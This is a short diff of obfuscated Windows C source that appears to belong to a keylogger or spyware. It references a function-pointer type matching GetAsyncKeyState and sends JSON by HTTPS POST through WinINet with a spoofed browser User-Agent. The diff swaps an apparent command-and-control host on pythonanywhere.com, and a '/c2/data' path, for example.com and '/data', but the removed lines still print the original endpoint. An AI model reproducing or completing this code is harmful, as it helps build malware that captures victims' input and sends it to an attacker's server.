@@ -11,7 +11,7 @@
 char V1[O1];
 int V2 = 0;
 CRITICAL_SECTION V3;
-char* O3 = "tdsoperational.pythonanywhere.com";
+char* O3 = "example.com";
 
 typedef SHORT (WINAPI *F3)(int);
 F3 O4;
@@ -80,7 +80,7 @@ void F1() {
     if (V20) {
         HINTERNET V21 = InternetConnectA(V20, O3, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
         if (V21) {
-            const char *O5 = "/c2/data";
+            const char *O5 = "/data";
             const char *O6 = "Content-Type: application/json\r\nUser-Agent: TLD9Browser/2.0";
             HINTERNET V22 = HttpOpenRequestA(V21, "POST", O5, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
             if (V22) {
